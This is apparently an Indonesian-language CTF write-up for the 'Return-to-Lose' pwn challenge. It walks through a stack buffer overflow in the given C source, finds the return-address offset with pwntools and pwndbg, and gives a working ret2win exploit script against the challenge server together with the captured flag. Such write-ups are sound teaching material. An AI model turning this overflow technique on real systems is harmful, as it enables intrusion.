# Return-to-Lose — Pwn Writeup

**CTF:** LyknCTF 2026
**Category:** Pwn
**Flag:** `LYKNCTF{cb39d487e265480b92a274a124c0dd66}`

---

## 1. Challenge Overview

Sebuah binary ELF 64-bit, statically linked address (No PIE), yang meminta input nama lalu keluar. Source code (`vuln.c`) diberikan:

```c
void win(void)
{
    char flag[128];
    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) {
        write(1, "flag.txt not found on this server.\n", 35);
        _exit(1);
    }
    ssize_t n = read(fd, flag, sizeof(flag));
    if (n > 0)
        write(1, flag, (size_t)n);
    _exit(0);
}

void vuln(void)
{
    char buf[64];
    write(1, "What's your name, traveler?\n> ", 30);
    read(0, buf, 256);
    write(1, "Safe travels!\n", 14);
}
```

Fungsi `win()` membaca dan mencetak isi `flag.txt`, tapi **tidak pernah dipanggil** di alur program normal (hanya `vuln()` yang dipanggil dari `main()`). Judul "Return-to-Lose" adalah petunjuk teknik yang dibutuhkan: **ret2win**.

### Binary protections (checksec)

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Poin penting:
- **No canary** → overflow ke saved RBP/return address tidak terdeteksi.
- **No PIE** → semua alamat fungsi statis, termasuk `win()`, tidak perlu leak.
- **SHSTK/IBT (Intel CET) enabled** di level binary, namun **tidak di-enforce di runtime** environment ini (kemungkinan kernel/glibc lokal belum mengaktifkan CET secara aktif) — sehingga ret2win polos tetap berhasil tanpa perlu bypass shadow stack.

---

## 2. Vulnerability

Di `vuln()`:

```c
char buf[64];
read(0, buf, 256);   // baca hingga 256 byte ke buffer 64 byte
```

Buffer `buf` hanya 64 byte, tapi `read()` mengizinkan input hingga 256 byte → classic **stack buffer overflow**, cukup untuk menimpa saved RBP dan return address.

---

## 3. Menentukan Offset

Menggunakan cyclic pattern dari `pwntools` untuk menemukan offset ke return address:

```bash
python3 -c "from pwn import *; print(cyclic(100))"
```

Input pattern tersebut dikirim via GDB (`pwndbg`):

```
pwndbg> r
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
Program received signal SIGSEGV.
RIP  0x401292 (vuln+76) ◂— ret
RSP  0x7fffffffce18 ◂— 0x6161617461616173 ('saaataaa')
```

Program crash tepat di instruksi `ret`, dan nilai di puncak stack (`RSP`) — yaitu byte yang akan di-`pop` sebagai return address — adalah 4 byte pertama string `"saaa"`.

Mencari offset dari byte tersebut (bukan dari RIP, karena RIP saat crash masih menunjuk instruksi `ret` itu sendiri):

```bash
python3 -c "from pwn import *; print(cyclic_find(b'saaa'))"
# → 72
```

**Offset ke return address = 72 byte**, sesuai perhitungan manual:
`buf[64]` + saved RBP (`8 byte`) = `72 byte`.

---

## 4. Menentukan Target Address

Karena binary **No PIE**, alamat `win()` bersifat statis dan bisa langsung dibaca dari simbol:

```
0x004011b6      GLOBAL FUNC   144      win
```

`WIN = 0x4011b6`

Tidak diperlukan info leak apa pun.

---

## 5. Exploit Script

```python
from pwn import *
context.arch = 'amd64'

OFFSET = 72
WIN = 0x4011b6

p = remote('51.79.140.18', 11094)   # ganti process() -> remote() untuk server
payload = b'A' * OFFSET + p64(WIN)
p.recvuntil(b'> ')
p.sendline(payload)
print(p.recvall(timeout=3).decode(errors='replace'))
```

**Payload:**
```
[64 byte padding buf] + [8 byte padding saved RBP] + [8 byte alamat win()]
```

Saat `vuln()` melakukan `ret`, CPU mengambil alamat `0x4011b6` dari stack dan melompat langsung ke `win()`, yang membuka `flag.txt` dan mencetak isinya ke stdout.

---

## 6. Hasil

**Local test:**
```
Safe travels!
LYKNCTF{f4k3_f14g}
```

**Remote (server asli):**
```
$ python3 exploit.py
[+] Opening connection to 51.79.140.18 on port 11094: Done
Safe travels!
LYKNCTF{cb39d487e265480b92a274a124c0dd66}
```

---

## 7. Ringkasan Teknik

| Aspek | Detail |
|---|---|
| Vulnerability | Stack buffer overflow (`read(0, buf, 256)` ke `buf[64]`) |
| Teknik | ret2win |
| Offset ke RA | 72 byte |
| Target | `win()` @ `0x4011b6` (No PIE, static) |
| Mitigasi yang diuji | Canary (tidak ada), NX (tidak relevan, tidak perlu shellcode), CET/SHSTK (enabled di binary, tidak enforced di runtime) |

**Flag:** `LYKNCTF{cb39d487e265480b92a274a124c0dd66}`
